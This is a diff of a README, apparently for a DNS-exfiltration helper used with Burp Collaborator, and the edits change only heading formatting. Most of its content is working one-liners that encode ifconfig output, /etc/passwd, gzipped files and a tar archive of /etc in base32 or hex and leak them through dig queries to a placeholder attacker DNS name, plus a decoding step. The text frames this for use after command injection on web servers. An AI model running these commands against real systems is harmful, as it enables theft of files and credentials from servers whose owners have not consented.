@@ -22,53 +22,53 @@ In the examples below: `<DNS Name>` is the random name provided by Burp Collabor
 
 For `base32`, the `-w63` flag specifies line wrapping at 63 bytes. For `xxd` (hex): the `-p` flag is 'output  in  postscript  continuous  hexdump style', and `-c31` is count of 31 hex characters (62 bytes sent).
 
-### Send STDOUT from a command:
+### Send STDOUT from a command
 
-base32:
+#### base32
 ```
 ifconfig | base32 -w63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
-Hex:
+#### hex
 ```
 ifconfig | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
-Decode the output:
+#### Decode the output
 ```
 dns-parse.py <DNS Name> (query.log|collaborator.log)
 ```
 
-### Exfiltrate a file:
+### Exfiltrate a file
 
 #### base32
 ```
 base32 -w63 < /etc/passwd | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
-Hex:
+#### hex
 ```
 xxd -p -c31 < /etc/passwd | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
-Decode the file:
+#### Decode the file
 ```
 dns-parse.py <DNS Name> (query.log|collaborator.log)
 ```
 
 ### Exfiltrate a compressed file:
 
-base32:
+#### base32
 ```
 gzip - < /etc/passwd | base32 -w63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
-Hex:
+#### hex
 ```
 gzip - < /etc/passwd | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
-Decode/unzip the file:
+#### Decode/unzip the file
 ```
 dns-parse.py <DNS Name> (query.log|collaborator.log) | zcat
 ```
@@ -77,17 +77,17 @@ dns-parse.py <DNS Name> (query.log|collaborator.log) | zcat
 
 Note that exfiltrating /etc on an Ubuntu Linux system worked (but was slow). It took 35 minutes, requiring 45,382 DNS requests, resulting in a 1.8 megabyte tar.gz file. Needless to say: the files/directories contained in the archive are restricted by the permissions of the running user. For command injection on web sites (using an account such as apache or www-data), many files/directories will likely be missing.
 
-base32:
+#### base32
 ```
 tar czf - /etc | base32 -w63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
-Hex:
+#### hex
 ```
 tar czf - /etc | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
-Decode/save the tar archive:
+#### Decode/save the tar archive
 ```
 dns-parse.py <DNS Name> (query.log|collaborator.log) > exfiltrated.tgz
 ```
